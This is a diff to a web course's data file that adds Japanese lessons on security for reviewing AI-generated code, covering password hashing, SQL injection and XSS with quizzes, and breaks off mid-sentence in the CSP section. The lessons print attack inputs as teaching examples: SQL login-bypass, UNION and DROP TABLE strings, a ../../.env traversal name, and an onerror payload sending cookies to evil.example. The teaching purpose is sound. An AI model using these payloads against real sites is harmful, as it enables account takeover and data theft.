@@ -3627,17 +3627,345 @@ window.SITE_DATA = {
    "icon": "🔐",
    "order": 130,
    "category": "topic",
-   "status": "planned",
-   "description": "AI のコードで見落としがちな危険を知る。",
-   "outline": [
-    "パスワードとハッシュ",
-    "XSS",
-    "SQL インジェクション",
-    "認証と認可",
-    "依存ライブラリの脆弱性"
-   ],
+   "description": "AI のコードで見落としがちな危険を、実際に攻撃を再現しながら理解する。考え方の基本、パスワード、SQL インジェクション、XSS、ログインとセッションの落とし穴、ライブラリとサプライチェーン、最後に総合演習。",
+   "levels": {
+    "1": "入門：攻撃者の目線",
+    "2": "基礎：代表的な攻撃",
+    "3": "実践：見落としやすいところ",
+    "4": "応用：総合演習"
+   },
    "id": "130-security",
-   "lessons": []
+   "lessons": [
+    {
+     "title": "セキュリティの考え方 ― 「外から来たものは信じない」",
+     "level": 1,
+     "minutes": 14,
+     "concepts": [
+      "security",
+      "reading"
+     ],
+     "summary": "攻撃者の目線、信頼の境界線、守るべき 3 つのもの（秘密・正しさ・使えること）、最小権限と多層防御。このコースで何度も使う「ものさし」。",
+     "body": "## このレッスンのゴール\n\n- 「信頼の境界線」の意味を説明し、コードの中で外から来るデータを見つけられる\n- 守るべき 3 つのもの（機密性・完全性・可用性）を、例で説明できる\n- 最小権限・多層防御という考え方を知り、AI のコードの判断に使える\n\n## 攻撃者は「想定外の使い方」をする\n\n普通の利用者は、名前の欄に名前を、数量の欄に 1〜10 くらいの数を入れます。攻撃者はそうしません。\n\n| 入力欄 | 普通の人 | 攻撃者が試すこと |\n|---|---|---|\n| 名前 | `Ryo` | `' OR '1'='1`（レッスン 3）、`<script>...</script>`（レッスン 4） |\n| 数量 | `2` | `-100`、`99999999999`、`2.5`、`\"abc\"` |\n| URL の ID | `/orders/15` | `/orders/16`（他人の注文、バックエンドコースの IDOR） |\n| ファイル | `photo.jpg` | 中身がプログラムの `photo.jpg`、10GB のファイル、`../../.env` という名前 |\n| ログイン | 正しいパスワードを 1 回 | よくあるパスワードを 1 秒に何千回 |\n\n**セキュリティとは、「想定外の使い方をされても、困ったことにならない」ようにすること** です。\n\n## 信頼の境界線\n\nプログラムの中で、**自分がコントロールしていないところから来るデータ** は、すべて攻撃者が自由に作れると考えます。\n\n```text\n         信頼できない（外）          │        信頼できる（中）\n                                    │\n  ブラウザから送られる値 ─────────→ │ → チェック → 自分のサーバーのコード\n  URL・フォーム・JSON・Cookie       │                    ↓\n  アップロードされたファイル         │               データベース\n  他社の API の返事                  │\n  AI（LLM）の出力                    │\n```\n\n| 「外」から来るもの | 例 |\n|---|---|\n| リクエストのすべて | URL・クエリ・フォーム・JSON の本文・ヘッダー・Cookie |\n| ブラウザ側のチェック | JavaScript の入力チェックは **飛ばせる**（直接リクエストを送ればよい） |\n| ファイル名・ファイルの中身 | 拡張子は名札にすぎない（コンピュータの基礎コース） |\n| 外部の API・Web ページ | 改ざん・乗っ取りの可能性 |\n| **LLM の出力** | 入力に紛れ込んだ命令に従ってしまうことがある（プロンプトインジェクション） |\n\n⚠️ 特に大事なのは **「ブラウザでチェックしているから大丈夫」は成り立たない** ことです。ブラウザのチェックは使いやすさのため、**守るためのチェックはサーバーで** します。\n\n## 守るべき 3 つのもの\n\n| | 意味 | 破られた例 |\n|---|---|---|\n| **機密性** | 見てよい人だけが見られる | 他人の住所が見える、パスワードが漏れる |\n| **完全性** | 正しい人が、正しいやり方でしか変えられない | 他人の投稿を消せる、値段を書き換えて買える |\n| **可用性** | 使いたいときに使える | 大量のリクエストでサーバーが落ちる、データが全部消える |\n\n英語の頭文字で **CIA**（Confidentiality・Integrity・Availability）と呼ばれます。AI のコードを見るときは、「この部分が破られたら、3 つのどれが壊れる？」と考えると、重要度の判断ができます。\n\n## 考え方 1：最小権限\n\n**必要な分だけの権限しか渡さない** という考え方です。\n\n| 場面 | 大きすぎる権限 | 最小権限 |\n|---|---|---|\n| GitHub のトークン | すべてのリポジトリに書き込める | 1 つのリポジトリの、必要な操作だけ |\n| データベースのユーザー | 管理者（テーブルを消せる） | 読み書きだけ |\n| OAuth のスコープ | メールも予定表も全部読める | プロフィールだけ（バックエンドコースのレッスン 18） |\n| AI のエージェント | 何でも実行してよい | 決めたフォルダの中だけ、危ないコマンドは確認 |\n\n権限が小さければ、**もし漏れたり乗っ取られたりしても、被害が小さく済みます**。\n\n## 考え方 2：多層防御\n\n1 つの対策に頼らず、**何枚も守りを重ねる** 考え方です。どれか 1 枚が破られても、次で止められます。\n\n```text\nブラウザの入力チェック → サーバーのバリデーション → プレースホルダ（SQL）→ データベースの制約 → ログと監視\n```\n\nデータベース設計のコースで、「アプリでチェックしていても、データベースにも制約を付ける」と学んだのも、この考え方です。\n\n## 考え方 3：秘密は「隠し場所」ではなく「鍵」で守る\n\n「URL を知っている人しか見られないから安全」「分かりにくい名前のフォルダに置いたから安全」は、**隠しているだけ** で、守っていません。URL は履歴・共有・ログから漏れます。\n本当に守るなら、**ログインして権限を確かめる** 仕組みにします。\n\n## AI のコードではこう出てくる\n\nAI のコードを読むときは、次の順番で見ていきます。このコースのレッスンが、それぞれの詳しい説明です。\n\n| 順番 | 見ること | レッスン |\n|---|---|---|\n| ① | 外から来るデータはどこから入る？（`request.`、`input()`、`req.body`、ファイル） | このレッスン |\n| ② | それは SQL・HTML・コマンド・ファイルパスに **そのまま** 使われていないか | 3・4 |\n| ③ | パスワード・トークン・秘密の扱いは正しいか | 2・5 |\n| ④ | 「誰が」「何を」してよいかを、サーバーで確かめているか | 5 |\n| ⑤ | 使っているライブラリは安全か | 6 |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
+     "quizzes": [
+      [
+       {
+        "question": "ブラウザの JavaScript で「数量は 1〜10」とチェックしている。サーバー側のチェックは必要？",
+        "choices": [
+         "不要。ブラウザでチェックしているので、おかしな値は送られてこない",
+         "必要。攻撃者はブラウザを使わずに、好きな値のリクエストを直接送れる",
+         "必要だが、数量のような小さなことには不要"
+        ],
+        "answer": 1,
+        "explain": "ブラウザのチェックは使いやすさのためのもので、飛ばせます。守るためのチェックは必ずサーバーで行います。"
+       },
+       {
+        "question": "「最小権限」の例として正しいのは？",
+        "choices": [
+         "開発を楽にするため、トークンには全部の権限を付けておく",
+         "リポジトリに保存するだけのトークンは、そのリポジトリの書き込み権限だけにする",
+         "管理者のアカウントを全員で共有する"
+        ],
+        "answer": 1,
+        "explain": "必要な分だけの権限にしておけば、漏れたときの被害が小さくなります。"
+       },
+       {
+        "question": "「URL を知っている人しか見られないので、ログインは不要」という設計の問題は？",
+        "choices": [
+         "URL は履歴・共有・ログなどから漏れるので、隠しているだけで守れていない",
+         "URL が長くなりすぎる",
+         "問題はない"
+        ],
+        "answer": 0,
+        "explain": "推測しにくい URL は補助にはなりますが、守りにはなりません。見てよい人かどうかを確かめる仕組みが必要です。"
+       }
+      ]
+     ],
+     "id": "01-mindset"
+    },
+    {
+     "title": "パスワードとハッシュ ― なぜ「遅い」ハッシュを使うのか",
+     "level": 2,
+     "minutes": 18,
+     "concepts": [
+      "security",
+      "auth"
+     ],
+     "summary": "SHA-256 では 1 秒に 100 万回以上試せてしまう。ソルト・bcrypt・Argon2 の役割を実際に測って確かめ、トークンの作り方や比べ方の落とし穴まで。",
+     "body": "## このレッスンのゴール\n\n- パスワードを SHA-256 や MD5 だけで保存してはいけない理由を、数字で説明できる\n- ソルトと「わざと遅いハッシュ」（bcrypt・Argon2）の役割が分かる\n- パスワードリセットのトークンなど、ランダムな値を安全に作る方法が分かる\n\nバックエンドコースのレッスン 9 で「bcrypt でハッシュ化する」ことを学びました。ここでは **なぜそれでなければいけないのか** を、実際に攻撃する側の立場で確かめます。\n\n## 前提：データベースは盗まれるかもしれない\n\nパスワードを守る仕組みは、「データベースの中身が盗まれた後」を想定しています。盗んだ人は、**手元のパソコンで好きなだけ試せます**。どれだけ時間を稼げるかが勝負です。\n\n## SHA-256 はなぜダメか\n\n```python\nimport hashlib\nhashlib.sha256(\"password\".encode()).hexdigest()\n# '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8'\n```\n\nハッシュは元に戻せない変換なので、一見安全そうです。でも、問題が 2 つあります。\n\n### ① 同じパスワードは、いつも同じハッシュ\n\n`password` の SHA-256 は、誰が計算しても上と同じ値です。よく使われるパスワードのハッシュを並べた **早見表（レインボーテーブル）** がネットに出回っているので、**検索するだけで元のパスワードが分かります**。\nMD5（`5f4dcc3b5aa765d61d8327deb882cf99` が `password`）はさらに有名です。\n\n### ② 速すぎる\n\n```python\nfor i in range(1_000_000):\n    hashlib.sha256(str(i).encode()).digest()\n# この環境（普通の Python・1 コア）で 1 秒に約 130 万回\n```\n\nSHA-256 は **速く計算できるように作られた** ハッシュです。ファイルが壊れていないかの確認には便利ですが、パスワードにとっては、攻撃者が **速く総当たりできる** ということです。\n\n```python\ntarget = hashlib.sha256(b\"4821\").hexdigest()      # 4 桁の暗証番号のハッシュが盗まれた\nfor i in range(10000):\n    if hashlib.sha256(f\"{i:04d}\".encode()).hexdigest() == target:\n        print(\"found\", f\"{i:04d}\")                # found 4821 … 約 3 ミリ秒\n```\n\n専用の機械（GPU）を使えば、1 秒に **何十億回** も試せます。8 文字の英小文字（約 2000 億通り）なら数分です。\n\n## 対策 1：ソルト\n\n**ユーザーごとに違うランダムな値（ソルト）を混ぜてから** ハッシュにします。\n\n```text\npassword + 「x7Kp...」→ ハッシュ A\npassword + 「Qm2v...」→ ハッシュ B   ← 同じパスワードでも違う値\n```\n\n- 早見表が使えなくなる（ソルトごとに作り直しになる）\n- 同じパスワードの人がいても、データベースを見ただけでは分からない\n\n## 対策 2：わざと遅いハッシュ\n\n```python\nimport bcrypt, time\n\nstart = time.perf_counter()\nhashed = bcrypt.hashpw(\"hana-2027\".encode(), bcrypt.gensalt())     # 初期設定のコスト 12\nprint(time.perf_counter() - start)       # 約 0.32 秒\n\nbcrypt.hashpw(b\"password\", bcrypt.gensalt())\n# b'$2b$12$5FSqAz1NnR26p6ckisKaEOVHfi4M4HUoozeb2Gei7cAuYAP8mKI9O'\nbcrypt.hashpw(b\"password\", bcrypt.gensalt())\n# b'$2b$12$eFQcohm2C.k24vmpTx4r5.xXUtRuWEgxmQpc30YW1VAXNWTlXvNC6'   ← 同じパスワードでも毎回違う\n```\n\n| | SHA-256 | bcrypt（コスト 12） |\n|---|---|---|\n| 1 回の計算 | 約 0.0000008 秒 | 約 0.32 秒 |\n| 1 秒に試せる数（この環境） | 約 130 万回 | 約 3 回 |\n\n**約 40 万倍遅い** ので、総当たりにかかる時間も 40 万倍になります。ログインする本人にとっては 0.3 秒の待ち時間ですが、何億回も試したい攻撃者にとっては致命的です。\n\nbcrypt の結果の文字列には、必要なものが全部入っています。\n\n```text\n$2b$12$5FSqAz1NnR26p6ckisKaEO VHfi4M4HUoozeb2Gei7cAuYAP8mKI9O\n │   │  └ ソルト（22 文字）     └ ハッシュ本体\n │   └ コスト（2 の 12 乗回くり返す。1 増やすと 2 倍遅くなる）\n └ 方式（bcrypt）\n```\n\nだから、ソルトを別の列に保存する必要はありません。`bcrypt.checkpw(入力, 保存した値)` が、中のソルトとコストを使って同じ計算をして比べてくれます。\n\n### Argon2：今のおすすめ\n\n```python\nfrom argon2 import PasswordHasher\nph = PasswordHasher()\nh = ph.hash(\"hana-2027\")\n# '$argon2id$v=19$m=65536,t=3,p=4$...'   m=65536 は 64MB のメモリを使う、という意味\nph.verify(h, \"hana-2027\")      # True\nph.verify(h, \"wrong\")          # VerifyMismatchError（例外）\n```\n\nArgon2 は **計算時間に加えて、メモリもたくさん使う** ので、GPU でまとめて試すのがさらに難しくなります。新しく作るなら Argon2（argon2id）、既存のものは bcrypt でも十分です。\n\n⚠️ bcrypt は **72 バイトまで** しか見ません。この環境の bcrypt 5 では、72 バイトを超えるパスワードを渡すと `ValueError: password cannot be longer than 72 bytes` になりました（古い版は黙って切り捨てます）。日本語は 1 文字 3 バイトなので、24 文字で上限です。\n\n## ランダムな値は `secrets` で作る\n\nパスワードリセットの URL、メール確認のコード、API キーなどは、**推測されない** ことがすべてです。\n\n```python\nimport random\nrandom.seed(42); [random.randint(0, 9) for _ in range(6)]   # [1, 0, 4, 3, 3, 2]\nrandom.seed(42); [random.randint(0, 9) for _ in range(6)]   # [1, 0, 4, 3, 3, 2]   ← 同じ並び\n\nimport secrets\nsecrets.token_urlsafe(32)        # 'q3J0...'（毎回違う、推測できない 43 文字）\nf\"{secrets.randbelow(1_000_000):06d}\"   # 6 桁の確認コード\n```\n\n`random` は、**種（シード）が分かれば次の値が予想できる** 作りです（ゲームやシミュレーション用）。セキュリティに関わる値は、必ず `secrets` を使います。JavaScript では `crypto.randomUUID()` や `crypto.getRandomValues()` を使い、`Math.random()` は使いません。\n\n## 比べ方にも注意\n\n```python\nif token == saved_token:                       # ⚠️ 先頭から 1 文字ずつ比べ、違った時点で終わる\nimport hmac\nif hmac.compare_digest(token, saved_token):    # ✅ いつも同じ時間で比べる\n```\n\n`==` は、違う文字が見つかった時点で終わるので、**何文字目まで合っていたかが、かかった時間からわずかに分かる** ことがあります（タイミング攻撃）。トークンや署名を比べるときは `hmac.compare_digest` を使います。bcrypt・Argon2 の確認関数は、中でこれを使っています。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 判定 |\n|---|---|\n| `hashlib.md5(password...)` / `hashlib.sha256(password...)` | ⚠️ パスワードには使わない。bcrypt か Argon2 に |\n| `bcrypt.hashpw(...)` / `PasswordHasher().hash(...)` / `passlib` / `pwdlib` | ✅ |\n| パスワードを暗号化（`Fernet` など）して保存し、復号して比べる | ⚠️ 鍵が漏れたら全員分が戻せる。ハッシュにする |\n| `random.choice(...)` でトークン・パスワードを作る | ⚠️ `secrets` に |\n| `token == request.args[\"token\"]` | ⚠️ `hmac.compare_digest` に |\n| パスワードを `print` やログに出している | ⚠️ ログから漏れる |\n| 「パスワードを忘れた」で今のパスワードをメールで送る | ⚠️ 元に戻せるということは、ハッシュにしていない |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
+     "quizzes": [
+      [
+       {
+        "question": "パスワードを SHA-256 だけでハッシュにして保存するのが危ない理由として、正しいものは？",
+        "choices": [
+         "SHA-256 は元に戻せるから",
+         "計算が速いので、盗まれたときに総当たりで大量に試されてしまうから",
+         "SHA-256 は長すぎて保存できないから"
+        ],
+        "answer": 1,
+        "explain": "SHA-256 は戻せませんが、速すぎます。この環境でも 1 秒に約 130 万回試せました。bcrypt なら約 3 回です。"
+       },
+       {
+        "question": "bcrypt で同じパスワードを 2 回ハッシュにすると、結果が毎回違う理由は？",
+        "choices": [
+         "bcrypt が壊れているから",
+         "ハッシュにするたびに、違うソルト（ランダムな値）を混ぜているから",
+         "時刻を混ぜているから"
+        ],
+        "answer": 1,
+        "explain": "ソルトのおかげで、早見表が使えず、同じパスワードの人がいても分かりません。ソルトは結果の文字列の中に入っているので、確認もできます。"
+       },
+       {
+        "question": "パスワードリセット用の URL に入れるトークンを作る方法として適切なのは？",
+        "choices": [
+         "`random.randint(100000, 999999)`",
+         "ユーザー ID と日時をつなげた文字列",
+         "`secrets.token_urlsafe(32)`"
+        ],
+        "answer": 2,
+        "explain": "`random` はシードが分かると予想できます。ID と日時も推測できます。`secrets` は推測できない値を作るためのモジュールです。"
+       }
+      ]
+     ],
+     "id": "02-passwords"
+    },
+    {
+     "title": "SQL インジェクション ― 入力が命令に変わる",
+     "level": 2,
+     "minutes": 18,
+     "concepts": [
+      "security",
+      "database",
+      "strings"
+     ],
+     "summary": "f 文字列で組み立てた SQL に細工した入力を入れると、ログインの突破やパスワードの盗み出しができてしまう。実際に再現し、プレースホルダで防ぐ。列名・並べ替えなど「? が使えない場所」の守り方も。",
+     "body": "## このレッスンのゴール\n\n- SQL インジェクションが起きる仕組みを、実際の SQL 文で説明できる\n- プレースホルダ（`?`）でなぜ防げるのかが分かる\n- テーブル名・列名・`ORDER BY` など、プレースホルダが使えない場所の守り方が分かる\n\n## 何が起きるのか\n\n```python\ndef find_user(name):\n    sql = f\"SELECT id, name FROM users WHERE name = '{name}'\"   # ⚠️ 入力を文字列に埋め込む\n    return conn.execute(sql).fetchall()\n```\n\n普通の入力なら、問題なく動きます。\n\n```text\n入力：ryo\nSQL ：SELECT id, name FROM users WHERE name = 'ryo'\n結果：[(2, 'ryo')]\n```\n\nでは、名前の欄に `' OR '1'='1` と入れると？\n\n```text\n入力：' OR '1'='1\nSQL ：SELECT id, name FROM users WHERE name = '' OR '1'='1'\n結果：[(1, 'admin'), (2, 'ryo')]     ← 全員が出てきた\n```\n\n入力の最初の `'` が、SQL の文字列を **途中で閉じて** しまいました。その後ろの `OR '1'='1'` は、もう「名前」ではなく **SQL の命令の一部** です。`'1'='1'` はいつも正しいので、全員の行が条件に合います。\nログインの処理でこれが起きると、**パスワードを知らなくても、最初のユーザー（多くは管理者）としてログインできてしまいます**。\n\n（このレッスンの例は、すべて SQLite の中で実際に再現したものです）\n\n## 別のテーブルを盗み出す\n\n商品の検索にも同じ穴があるとします。\n\n```python\ndef search(q):\n    sql = f\"SELECT name, price FROM products WHERE name LIKE '%{q}%'\"\n    return conn.execute(sql).fetchall()\n```\n\n```text\n入力：' UNION SELECT name, password_hash FROM users --\nSQL ：SELECT name, price FROM products WHERE name LIKE '%' UNION SELECT name, password_hash FROM users --%'\n結果：[('admin', '$2b$12$xxx'), ('ryo', '$2b$12$yyy'), ('りんご', 120), ('牛乳', 200)]\n```\n\n| 入力の部分 | 役割 |\n|---|---|\n| `'` | 文字列を閉じる |\n| `UNION SELECT name, password_hash FROM users` | **別の SELECT の結果をくっつける**（列の数を 2 つにそろえている） |\n| `--` | SQL のコメント。後ろに残った `%'` を無視させる |\n\n**商品検索の画面に、ユーザーのパスワードのハッシュが表示されました**。前のレッスンで「データベースは盗まれるかもしれない」と考えたのは、こういうことが起きるからです。\n\n`'; DROP TABLE products; --` のように、命令を 2 つにしてテーブルを消す攻撃も有名です。Python の `sqlite3` の `execute` は、1 回に 1 つの命令しか実行しないので、この形は `You can only execute one statement at a time.` で止まりました。ただし、**他のデータベースやライブラリでは通ることがある** ので、安心材料にはなりません。\n\n## 防ぎ方：プレースホルダ\n\n```python\nconn.execute(\"SELECT id, name FROM users WHERE name = ?\", (name,))\n```\n\n```text\n入力：' OR '1'='1\n結果：[]     ← 「' OR '1'='1 という名前の人」を探したので、0 件\n```\n\n```python\nconn.execute(\"SELECT name, price FROM products WHERE name LIKE ?\", (f\"%{q}%\",))\n# UNION の入力でも：[]\n```\n\nプレースホルダ（`?`）を使うと、**SQL の形（命令）と、値（データ）が別々にデータベースへ渡されます**。データベースは先に SQL の形を決めてから値をはめ込むので、値の中に `'` や `UNION` があっても、**ただの文字として扱われ、命令にはなりません**。\n\n| データベース／ライブラリ | プレースホルダの書き方 |\n|---|---|\n| Python の sqlite3 | `?` |\n| psycopg（PostgreSQL） | `%s`（⚠️ 文字列の `%` 演算子とは別物） |\n| Node.js の better-sqlite3・D1 | `?` ＋ `.bind()` / `.run(値)` |\n| node-postgres | `$1`, `$2` |\n| SQLAlchemy の `text()` | `:name` ＋ `{\"name\": 値}` |\n\n⚠️ psycopg の `%s` は、`cur.execute(\"... WHERE name = %s\", (name,))` のように **第 2 引数で** 渡します。`\"... = %s\" % name` と `%` 演算子でつなぐと、f 文字列と同じく危険です。\n\n## プレースホルダが使えない場所\n\nプレースホルダで渡せるのは **値** だけです。テーブル名・列名・`ASC`/`DESC` のような **SQL の言葉そのもの** は渡せません。\n\n```python\nconn.execute(\"SELECT * FROM ?\", (\"users\",))\n# sqlite3.OperationalError: near \"?\": syntax error\n\nconn.execute(\"SELECT name FROM products ORDER BY ?\", (\"price DESC\",)).fetchall()\n# エラーにはならないが、「'price DESC' という固定の文字列」で並べたことになり、並べ替えが効かない\n```\n\n並べ替えの列を利用者に選ばせたいときは、**許可した値の一覧（許可リスト）** と照らし合わせます。\n\n```python\nSORTABLE = {\"name\": \"name\", \"price\": \"price\", \"new\": \"created_at\"}\n\ndef list_products(sort, desc):\n    column = SORTABLE.get(sort, \"name\")          # 一覧に無ければ name\n    direction = \"DESC\" if desc else \"ASC\"        # 2 択に固定\n    sql = f\"SELECT name, price FROM products ORDER BY {column} {direction}\"\n    return conn.execute(sql).fetchall()\n```\n\nf 文字列を使っていますが、入るのは **自分で書いた一覧の中の文字列だけ** なので安全です。**利用者の入力そのものを SQL に入れない** ことがポイントです。\n\n## ORM を使っていても\n\n```python\nsession.execute(text(f\"SELECT * FROM users WHERE name = '{name}'\"))    # ⚠️ ORM でも同じ穴\nsession.execute(text(\"SELECT * FROM users WHERE name = :name\"), {\"name\": name})   # ✅\nUser.objects.raw(f\"SELECT ... WHERE name = '{name}'\")                   # ⚠️ Django でも\n```\n\nORM の普通の書き方（`select(User).where(User.name == name)`）は自動でプレースホルダになりますが、**生の SQL を書く機能** では、自分で守る必要があります。\n\n## 他の「インジェクション」\n\n「外から来た文字列を、別の言語の命令に混ぜる」と、同じ種類の問題が起きます。\n\n| 混ぜる先 | 危ない書き方 | 安全な書き方 |\n|---|---|---|\n| SQL | `f\"... WHERE name = '{name}'\"` | プレースホルダ |\n| HTML | `el.innerHTML = name` | 次のレッスン（XSS） |\n| シェルのコマンド | `os.system(f\"convert {filename} out.png\")` | `subprocess.run([\"convert\", filename, \"out.png\"])`（リストで渡す） |\n| ファイルのパス | `open(f\"uploads/{filename}\")` | `../../.env` のような名前を拒否する（`Path(...).resolve()` が uploads の中か確かめる） |\n| LLM へのプロンプト | 利用者の文章をそのまま指示に混ぜる | 指示とデータを分け、LLM の出力を信用しすぎない |\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 判定 |\n|---|---|\n| `execute(f\"...{x}...\")` / `execute(\"...\" + x)` / `execute(\"... %s\" % x)` | ⚠️ SQL インジェクション |\n| `execute(\"... = ?\", (x,))` / `execute(\"... = %s\", (x,))` | ✅ |\n| `` db.prepare(`... ${x}`) ``（JavaScript のテンプレート文字列） | ⚠️ 同じ穴 |\n| `ORDER BY {sort}` に `request.args[\"sort\"]` をそのまま | ⚠️ 許可リストに |\n| `os.system(f\"...\")` / `subprocess.run(..., shell=True)` に外からの値 | ⚠️ コマンドインジェクション |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
+     "quizzes": [
+      [
+       {
+        "question": "`f\"SELECT * FROM users WHERE name = '{name}'\"` に `' OR '1'='1` を入れると、なぜ全員が出てくる？",
+        "choices": [
+         "データベースのバグだから",
+         "入力の `'` で文字列が閉じられ、`OR '1'='1'` が SQL の条件として実行されるから",
+         "`OR` という名前のユーザーがいるから"
+        ],
+        "answer": 1,
+        "explain": "入力が「値」ではなく「命令の一部」になってしまうのが SQL インジェクションです。`'1'='1'` はいつも正しいので、全行が条件に合います。"
+       },
+       {
+        "question": "プレースホルダ（`?`）を使うと防げる理由は？",
+        "choices": [
+         "入力から `'` を自動で削除するから",
+         "SQL の形と値を別々に渡すので、値の中身が命令として解釈されないから",
+         "入力の長さを制限するから"
+        ],
+        "answer": 1,
+        "explain": "データベースは SQL の形を先に決めてから値をはめ込みます。値に `'` や `UNION` が含まれていても、ただの文字として扱われます。"
+       },
+       {
+        "question": "利用者が並べ替えの列（`name`・`price`）を選べるようにしたい。安全な方法は？",
+        "choices": [
+         "`ORDER BY ?` にして、選んだ列名を渡す",
+         "入力から `'` を取り除いてから f 文字列で埋め込む",
+         "許可した列名の一覧と照らし合わせ、一覧の中の文字列だけを SQL に入れる"
+        ],
+        "answer": 2,
+        "explain": "列名はプレースホルダで渡せません（渡しても並べ替えが効きません）。利用者の入力そのものではなく、自分で用意した一覧の値を使います。"
+       }
+      ]
+     ],
+     "id": "03-sql-injection"
+    },
+    {
+     "title": "XSS ― 他人のブラウザで勝手にプログラムが動く",
+     "level": 2,
+     "minutes": 20,
+     "concepts": [
+      "security",
+      "dom_ui",
+      "strings"
+     ],
+     "summary": "入力に仕込んだ HTML がそのまま表示されると、見た人のブラウザでプログラムが動く。innerHTML と textContent の違いを実際のブラウザで確かめ、エスケープ・サニタイズ・CSP で防ぐ。このサイト自身の守り方も読む。",
+     "body": "## このレッスンのゴール\n\n- XSS（クロスサイトスクリプティング）で何ができてしまうのかを説明できる\n- `innerHTML` と `textContent` の違い、エスケープとサニタイズの違いが分かる\n- テンプレート（Jinja2・React）が自動で守ってくれる範囲と、守ってくれない書き方が分かる\n\n## 何が起きるのか\n\n掲示板に、こんな「名前」で投稿されたとします。\n\n```html\n<img src=x onerror=\"fetch('https://evil.example/steal?c=' + document.cookie)\">\n```\n\nこれをそのまま HTML として表示すると、\n\n1. ブラウザは `<img>` を画像だと思って `x` を読み込もうとする\n2. `x` という画像は無いので、読み込みに失敗する\n3. 失敗したときに実行する `onerror` の中身（JavaScript）が動く\n4. **その掲示板を見た人全員** のブラウザで、Cookie などが攻撃者に送られる\n\n攻撃者のプログラムが、**被害者のブラウザの中で、そのサイトの一員として動く** のが XSS です。\n\n| XSS でできてしまうこと | |\n|---|---|\n| ログイン状態（Cookie・localStorage のトークン）を盗む | 被害者になりすませる |\n| 被害者として操作する | 投稿・送金・パスワード変更 |\n| 画面を書き換える | 偽のログイン画面を出してパスワードを入力させる |\n\n## innerHTML と textContent\n\n実際のブラウザ（Chromium）で、同じ文字列を 2 通りに表示してみました。\n\n```javascript\nconst evil = '<img src=x onerror=\"window.hacked.push(\\'innerHTML\\')\">こんにちは';\n\ndocument.getElementById(\"a\").innerHTML = evil;      // HTML として解釈する\ndocument.getElementById(\"b\").textContent = evil;    // ただの文字として表示する\n```\n\n```text\nwindow.hacked → [\"innerHTML\"]                    ← innerHTML の方だけ、onerror が実行された\nb の中身      → &lt;img src=x onerror=...&gt;こんにちは   ← 文字のまま表示された（実行されない）\n```\n\n| | `innerHTML` | `textContent` |\n|---|---|---|\n| `<b>太字</b>` | **太字** になる | `<b>太字</b>` という文字が見える |\n| 外からの文字列に使うと | ⚠️ XSS | ✅ 安全 |\n\n**外から来た文字列を表示するときは `textContent`** が基本です。\n\nちなみに、`innerHTML` で `<script>...</script>` を入れても実行されません（ブラウザの決まり）。でも、上のように `onerror` などを使えば実行できるので、「`<script>` を消せば安全」は間違いです。\n\n## エスケープ：HTML の記号を文字に変える\n\nHTML の中に文字列を埋め込むときは、意味を持つ記号を **別の書き方（文字参照）に置き換え** ます。これを **エスケープ** と呼びます。\n\n| 記号 | 置き換え後 |\n|---|---|\n| `<` | `&lt;` |\n| `>` | `&gt;` |\n| `&` | `&amp;` |\n| `\"` | `&quot;` |\n| `'` | `&#39;` |\n\n```python\nimport html\nhtml.escape('<a href=\"x\">&</a>')\n# '&lt;a href=&quot;x&quot;&gt;&amp;&lt;/a&gt;'\n```\n\n### このサイトの守り方\n\nこのサイトの `site/app.js` にも、同じ仕組みがあります。\n\n```javascript\nconst esc = (s) =>\n  String(s ?? \"\").replace(/[&<>\"']/g, (c) => ({ \"&\": \"&amp;\", \"<\": \"&lt;\", \">\": \"&gt;\", '\"': \"&quot;\", \"'\": \"&#39;\" }[c]));\n```\n\n5 つの記号を、正規表現で見つけて置き換えています。画面を組み立てるときに `${esc(c.title)}` のように、**文字列を HTML に入れる前に必ず通している** のが読み取れます。\n\n## テンプレートは自動でエスケープしてくれる\n\n```python\nfrom jinja2 import Environment\nt = \"<p>こんにちは、{{ name }} さん</p>\"\n\nEnvironment(autoescape=True).from_string(t).render(name=\"<script>alert(1)</script>\")\n# '<p>こんにちは、&lt;script&gt;alert(1)&lt;/script&gt; さん</p>'   ← 安全\n\nEnvironment(autoescape=False).from_string(t).render(name=\"<script>alert(1)</script>\")\n# '<p>こんにちは、<script>alert(1)</script> さん</p>'                ← 危ない\n```\n\nFlask・Django のテンプレート、React の `{name}`、Vue の `{{ name }}` は、**初期設定で自動エスケープ** してくれます。危ないのは、それを **わざと外す書き方** です。\n\n| フレームワーク | 自動エスケープを外す書き方（⚠️） |\n|---|---|\n| Jinja2（Flask） | `{{ bio \\| safe }}`、`Markup(...)`、`autoescape=False` |\n| Django | `{{ bio \\| safe }}`、`mark_safe(...)` |\n| React | `dangerouslySetInnerHTML={{ __html: bio }}` |\n| Vue | `v-html=\"bio\"` |\n| 素の JavaScript | `innerHTML`、`outerHTML`、`insertAdjacentHTML`、`document.write` |\n\n```python\nEnvironment(autoescape=True).from_string(\"<p>{{ bio | safe }}</p>\").render(bio=\"<img src=x onerror=alert(1)>\")\n# '<p><img src=x onerror=alert(1)></p>'      ← | safe で守りが外れた\n```\n\n## HTML を表示したいとき：サニタイズ\n\nブログの本文のように、**太字やリンクは使わせたいが、危ないものは消したい** ときは、**サニタイズ**（危ない部分だけを取り除く）をします。自分で書かず、専用のライブラリを使います。\n\n```javascript\nDOMPurify.sanitize('<img src=x onerror=\"...\">こんにちは')\n// '<img src=\"x\">こんにちは'     ← onerror だけが消えた（実際に確認）\n```\n\nこのサイトも、レッスンの Markdown を HTML にした後、必ず DOMPurify を通しています。\n\n```javascript\nconst md = (text) => DOMPurify.sanitize(marked.parse(text ?? \"\"));\n```\n\n| | エスケープ | サニタイズ |\n|---|---|---|\n| すること | 記号を全部文字に変える | 危ないタグ・属性だけを取り除く |\n| `<b>太字</b>` | 文字として見える | 太字になる |\n| 使う場面 | 名前・コメントなど、HTML を使わせない場所（ほとんど） | Markdown・リッチテキストを表示する場所 |\n| Python | `html.escape`、テンプレートの自動エスケープ | `nh3`、`bleach` |\n| JavaScript | `textContent`、React の `{}` | DOMPurify |\n\n## もう一枚の守り：CSP\n\n**CSP（コンテンツセキュリティポリシー）** は、「このページでは、どこから来た JavaScript なら実行してよいか」をブラウザに伝える仕組みです。\n\n```http\nContent-Security-Policy: default-src 'self'; script-src 'self'\n```\n\nこれがあると、ページの中に紛れ込んだ 